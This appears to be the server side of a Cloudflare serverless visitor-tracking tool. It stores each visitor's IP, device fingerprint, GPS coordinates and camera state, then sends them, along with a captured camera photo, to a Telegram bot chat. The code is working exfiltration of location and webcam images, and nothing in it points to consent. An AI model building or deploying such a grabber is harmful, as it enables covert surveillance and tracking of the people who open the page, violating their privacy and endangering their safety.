export async function onRequestPost({ request, env }) {

  const body = await request.json();
  const id = body.session_id;

  const ip = request.headers.get("CF-Connecting-IP");

  let session = await env.VISITOR_KV.get(id);
  session = session ? JSON.parse(session) : {};

  Object.assign(session, body, {
    ip,
    updated: new Date().toISOString()
  });

  await env.VISITOR_KV.put(id, JSON.stringify(session));

  if (body.event === "final") {
    await sendTelegram(env, session);
  }

  return new Response("ok");
}

async function sendTelegram(env, s) {

  const msg = `
📡 Visitor Report

🆔 ${s.session_id}
👤 ${s.user_id}

🌐 IP: ${s.ip}

📱 ${s.platform || ""}
🧠 ${s.userAgent || ""}

🧬 FP: ${s.fingerprint?.slice(0,20)}

📶 ${s.effectiveType || "N/A"}

📍 ${s.lat ? s.lat + "," + s.lng : "Denied"}

📷 ${s.camera}
`;

  await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: env.CHAT_ID,
      text: msg
    })
  });

  if (s.image) {
    const blob = await (await fetch(s.image)).blob();
    const form = new FormData();
    form.append("chat_id", env.CHAT_ID);
    form.append("photo", blob);

    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });
  }
}